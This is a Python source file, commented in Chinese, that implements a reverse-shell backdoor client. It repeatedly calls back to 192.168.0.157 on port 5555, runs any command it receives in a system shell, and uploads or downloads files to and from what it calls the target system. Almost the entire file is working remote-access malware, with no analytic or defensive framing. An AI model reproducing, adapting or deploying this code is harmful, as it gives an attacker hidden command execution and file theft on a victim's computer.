import socket
import time
import subprocess
import json
import os

# 建立一個TCP socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 可靠地接收數據
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
        except ConnectionResetError:
            print("連接被重置，嘗試重新連接。")
            return None
        except Exception as e:
            print(f"接收數據時發生錯誤: {e}")
            return None

# 可靠地發送數據
def reliable_send(data):
    try:
        json_data = json.dumps(data)
        s.send(json_data.encode())
    except ConnectionResetError:
        print("連接被重置，嘗試重新連接。")
        return False
    except Exception as e:
        print(f"發送數據時發生錯誤: {e}")
        return False
    return True


# 建立與服務器的連接
def connection():
    while True:
        time.sleep(5)  # 等待5秒後再次嘗試連接
        try:
            s.connect(('192.168.0.157', 5555))
            shell()
            s.close()
            break
        except:
            continue

# 上傳文件到目標系統
def upload_file(filename):
    try:
        with open(filename, 'rb') as f:
            s.send(f.read())  # 讀取文件數據並發送到目標系統
    except Exception as e:
        reliable_send(str(e))  # 如果出現錯誤，發送錯誤消息

# 從目標系統下載文件
def download_file(filename):
    try:
        with open(filename, 'wb') as f:
            s.settimeout(1)
            while True:
                try:
                    chunk = s.recv(1024)
                    if not chunk:
                        break
                    f.write(chunk)  # 將接收到的數據寫入文件
                except socket.timeout:
                    break
            s.settimeout(None)
    except Exception as e:
        reliable_send(str(e))  # 如果出現錯誤，發送錯誤消息

# 執行shell命令
def shell():
    while True:
        command = reliable_recv()
        if command is None:
            break
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command.startswith('cd '):
            try:
                os.chdir(command[3:])
                if not reliable_send(f"Changed directory to {os.getcwd()}"):
                    break
            except FileNotFoundError as e:
                if not reliable_send(str(e)):
                    break
        elif command.startswith('download '):
            download_file(command[9:])
        elif command.startswith('upload '):
            upload_file(command[7:])
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            try:
                stdout, stderr = execute.communicate(timeout=20)  # 設置超時時間為 10 秒
            except subprocess.TimeoutExpired:
                execute.kill()
                stdout, stderr = execute.communicate()
                result = "命令執行超時"
            else:
                result = stdout.decode() + stderr.decode()
            reliable_send(result)


if __name__ == '__main__':
    # 嘗試與服務器建立連接
    connection()
